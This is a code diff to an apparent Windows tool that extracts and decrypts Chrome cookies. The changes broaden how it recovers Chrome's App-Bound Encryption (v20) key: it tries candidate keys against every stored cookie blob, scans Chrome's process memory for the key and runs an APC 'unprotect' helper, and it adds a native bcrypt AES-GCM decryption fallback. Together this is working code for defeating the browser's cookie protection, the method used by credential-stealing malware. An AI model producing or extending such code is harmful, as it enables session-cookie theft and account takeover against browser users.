@@ -78,6 +78,7 @@ _cache: dict[str, Any] = {
     "abe_hr": "",
     "v20_blobs": 0,
     "v20_ok": 0,
+    "_v20_verify": [],
 }
 
 # In-process memo of Local State unwrap. Key bytes stay in RAM only.
@@ -165,6 +166,7 @@ def _discover_uncached() -> tuple[str, str, str]:
     _cache["abe_hr"] = ""
     _cache["v20_blobs"] = 0
     _cache["v20_ok"] = 0
+    _cache["_v20_verify"] = []
     pairs_all: list[tuple[str, str]] = []
     decrypt_failures = 0
     found_hosts = 0
@@ -185,7 +187,9 @@ def _discover_uncached() -> tuple[str, str, str]:
         if not source:
             source = label
         _cache["source"] = source
-        sample = _pick_v20_sample(rows)
+        samples = _v20_samples_from_rows(rows)
+        _cache["_v20_verify"] = samples
+        sample = samples[0] if samples else None
         try:
             keys = _browser_keys(profile["local_state"], v20_sample=sample)
         except Exception as exc:  # noqa: BLE001 — ABE must not abort discover
@@ -2487,28 +2491,36 @@ def _valid_v20_sample(blob: bytes | None) -> bool:
     return bool(blob and blob[:3] == b"v20" and len(blob) >= 3 + 12 + 16 + 1)
 
 
-def _pick_v20_sample(rows: list[Any]) -> bytes | None:
-    """Longest usable v20 blob. Short `v20` prefixes cannot verify a key."""
-    best: bytes | None = None
+def _v20_samples_from_rows(rows: list[Any]) -> list[bytes]:
+    """All usable v20 blobs, longest first. Never log the bytes."""
+    found: list[bytes] = []
+    seen: set[bytes] = set()
     for _h, _n, _v, enc in rows:
         if not isinstance(enc, (bytes, bytearray)):
             continue
         blob = bytes(enc)
-        if not _valid_v20_sample(blob):
+        if not _valid_v20_sample(blob) or blob in seen:
             continue
-        if best is None or len(blob) > len(best):
-            best = blob
-    return best
+        seen.add(blob)
+        found.append(blob)
+    found.sort(key=len, reverse=True)
+    return found
 
 
-def _v20_sample_from_cache() -> bytes | None:
-    """Read a v20 blob from the already-landed Cookies snapshot. No lock_bypass."""
+def _pick_v20_sample(rows: list[Any]) -> bytes | None:
+    """Longest usable v20 blob. Short `v20` prefixes cannot verify a key."""
+    samples = _v20_samples_from_rows(rows)
+    return samples[0] if samples else None
+
+
+def _v20_samples_from_cache() -> list[bytes]:
+    """All v20 blobs from the already-landed Cookies snapshot. No lock_bypass."""
     cache_dir = _cookie_snapshot_cache_dir()
     if cache_dir is None:
-        return None
+        return []
     path = cache_dir / "Cookies"
     if not path.is_file():
-        return None
+        return []
     try:
         conn = sqlite3.connect(f"file:{path.resolve().as_posix()}?mode=ro", uri=True)
         try:
@@ -2520,8 +2532,14 @@ def _v20_sample_from_cache() -> bytes | None:
         finally:
             conn.close()
     except sqlite3.Error:
-        return None
-    return _pick_v20_sample(rows)
+        return []
+    return _v20_samples_from_rows(rows)
+
+
+def _v20_sample_from_cache() -> bytes | None:
+    """Longest v20 blob from the already-landed Cookies snapshot. No lock_bypass."""
+    samples = _v20_samples_from_cache()
+    return samples[0] if samples else None
 
 
 def _resolve_v20_sample(v20_sample: bytes | None) -> bytes | None:
@@ -3058,10 +3076,39 @@ def _abe_hr_from_stderr(stderr: bytes | None) -> str:
     return ""
 
 
-def _v20_key_ok(key: bytes | None, v20_sample: bytes) -> bool:
-    if not key or not v20_sample or v20_sample[:3] != b"v20":
+def _v20_verify_samples(primary: bytes | None) -> list[bytes]:
+    """Every landed v20 blob. Longest-only rejected a rotated key (apc:ok, v20_ok=0)."""
+    out: list[bytes] = []
+    seen: set[bytes] = set()
+
+    def add(blob: bytes | None) -> None:
+        if not _valid_v20_sample(blob):
+            return
+        raw = bytes(blob or b"")
+        if raw in seen:
+            return
+        seen.add(raw)
+        out.append(raw)
+
+    add(primary)
+    cached = _cache.get("_v20_verify")
+    if isinstance(cached, list):
+        for blob in cached:
+            if isinstance(blob, (bytes, bytearray)):
+                add(bytes(blob))
+    if len(out) < 2:
+        for blob in _v20_samples_from_cache():
+            add(blob)
+    return out
+
+
+def _v20_key_ok(key: bytes | None, v20_sample: bytes | None) -> bool:
+    if not key:
         return False
-    return bool(_aes_gcm_decrypt_bytes(v20_sample[3:], key))
+    for sample in _v20_verify_samples(v20_sample):
+        if _aes_gcm_decrypt_bytes(sample[3:], key):
+            return True
+    return False
 
 
 def _key_from_helper_candidates(stdout: bytes, v20_sample: bytes) -> bytes | None:
@@ -3912,13 +3959,14 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
         if _v20_key_ok(cand, v20_sample):
             return cand
         if unprotect is not None and unprotect.ok:
-            if addr:
-                plain = unprotect.unprotect_at(addr)
-                if _v20_key_ok(plain, v20_sample):
-                    return plain
+            # Copy first (Chrome decrypts a copy). Use every APC plain against all 27.
             plain = unprotect.unprotect(cand)
             if _v20_key_ok(plain, v20_sample):
                 return plain
+            if addr:
+                inplace = unprotect.unprotect_at(addr)
+                if _v20_key_ok(inplace, v20_sample):
+                    return inplace
         return None
 
     probed_apc = False
@@ -3940,8 +3988,10 @@ def _memscan_abe_key(v20_sample: bytes) -> tuple[bytes | None, str]:
             unprotect_ok += 1
             if not probed_apc:
                 # One SAME_PROCESS APC so failure hr cannot omit apc:0 / apc:ok / apc:hr.
-                unprotect.unprotect(b"\x00" * 32)
+                probe_plain = unprotect.unprotect(b"\x00" * 32)
                 probed_apc = True
+                if _v20_key_ok(probe_plain, v20_sample):
+                    return probe_plain, "ok"
         try:
             addr = 0
             while addr < 0x00007FFFFFFEFFFF and scanned < _ABE_MEMSCAN_MAX_BYTES:
@@ -4166,6 +4216,96 @@ def _v20_cookie_text(plain: bytes) -> str:
     return ""
 
 
+def _aes_gcm_decrypt_bcrypt(payload: bytes, key: bytes) -> bytes:
+    """Windows CNG AES-GCM. quoting PC has no cryptography in requirements.txt."""
+    if os.name != "nt" or len(payload) < 28 or len(key) not in {16, 24, 32}:
+        return b""
+    try:
+        import ctypes
+        from ctypes import wintypes
+    except ImportError:
+        return b""
+    nonce = payload[:12]
+    tag = payload[-16:]
+    ciphertext = payload[12:-16]
+    if not ciphertext:
+        return b""
+
+    class BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(ctypes.Structure):
+        _fields_ = [
+            ("cbSize", wintypes.ULONG),
+            ("dwInfoVersion", wintypes.ULONG),
+            ("pbNonce", ctypes.c_void_p),
+            ("cbNonce", wintypes.ULONG),
+            ("pbAuthData", ctypes.c_void_p),
+            ("cbAuthData", wintypes.ULONG),
+            ("pbTag", ctypes.c_void_p),
+            ("cbTag", wintypes.ULONG),
+            ("pbMacContext", ctypes.c_void_p),
+            ("cbMacContext", wintypes.ULONG),
+            ("cbAAD", wintypes.ULONG),
+            ("cbData", ctypes.c_ulonglong),
+            ("dwFlags", wintypes.ULONG),
+        ]
+
+    bcrypt = ctypes.WinDLL("bcrypt")
+    h_alg = ctypes.c_void_p()
+    h_key = ctypes.c_void_p()
+    if int(bcrypt.BCryptOpenAlgorithmProvider(ctypes.byref(h_alg), "AES", None, 0)):
+        return b""
+    try:
+        gcm = ctypes.create_unicode_buffer("ChainingModeGCM")
+        if int(
+            bcrypt.BCryptSetProperty(
+                h_alg, "ChainingMode", gcm, ctypes.sizeof(gcm), 0
+            )
+        ):
+            return b""
+        key_buf = ctypes.create_string_buffer(key, len(key))
+        if int(
+            bcrypt.BCryptGenerateSymmetricKey(
+                h_alg, ctypes.byref(h_key), None, 0, key_buf, len(key), 0
+            )
+        ):
+            return b""
+        nonce_buf = ctypes.create_string_buffer(nonce, 12)
+        tag_buf = ctypes.create_string_buffer(tag, 16)
+        ct_buf = ctypes.create_string_buffer(ciphertext, len(ciphertext))
+        out_buf = ctypes.create_string_buffer(len(ciphertext))
+        info = BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO()
+        info.cbSize = ctypes.sizeof(info)
+        info.dwInfoVersion = 1
+        info.pbNonce = ctypes.cast(nonce_buf, ctypes.c_void_p)
+        info.cbNonce = 12
+        info.pbTag = ctypes.cast(tag_buf, ctypes.c_void_p)
+        info.cbTag = 16
+        got = wintypes.ULONG(0)
+        status = int(
+            bcrypt.BCryptDecrypt(
+                h_key,
+                ct_buf,
+                len(ciphertext),
+                ctypes.byref(info),
+                None,
+                0,
+                out_buf,
+                len(ciphertext),
+                ctypes.byref(got),
+                0,
+            )
+        )
+        if status != 0 or int(got.value) <= 0:
+            return b""
+        return out_buf.raw[: int(got.value)]
+    except (AttributeError, OSError, TypeError, ValueError):
+        return b""
+    finally:
+        if h_key.value:
+            bcrypt.BCryptDestroyKey(h_key)
+        if h_alg.value:
+            bcrypt.BCryptCloseAlgorithmProvider(h_alg, 0)
+
+
 def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
     if len(payload) < 16 + 16 or not key:
         return b""
@@ -4183,7 +4323,7 @@ def _aes_gcm_decrypt_bytes(payload: bytes, key: bytes) -> bytes:
             cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
             return cipher.decrypt_and_verify(ciphertext, tag)
         except Exception:  # noqa: BLE001
-            return b""
+            return _aes_gcm_decrypt_bcrypt(payload, key)
 
 
 # Memory-scan helper. stdin = v20 cookie sample; stdout = AES key or cand=<hex>.
@@ -4267,7 +4407,7 @@ class K {
     public IntPtr pbMacContext;
     public int cbMacContext;
     public int cbAAD;
-    public int cbData;
+    public long cbData;
     public int dwFlags;
   }
 
